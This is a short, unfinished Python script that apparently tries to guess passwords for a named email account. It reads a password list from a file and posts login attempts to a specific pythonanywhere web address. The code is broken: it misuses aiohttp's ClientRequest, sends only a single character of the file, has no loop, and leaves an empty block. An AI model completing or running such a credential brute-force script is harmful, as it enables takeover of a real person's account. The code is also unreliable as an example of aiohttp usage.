import aiohttp
import asyncio

async def main(file):
    i=0
    text = open(file,'r').read()
    async with aiohttp.ClientRequest() as request:
        async  with request.post('https://artemiikabanov.pythonanywhere.com/',
                                 json={'login': 'lazarev1974@mail.ru', 'password': text[i]}) as resp:




asyncio.run(main('passwords3.txt'))
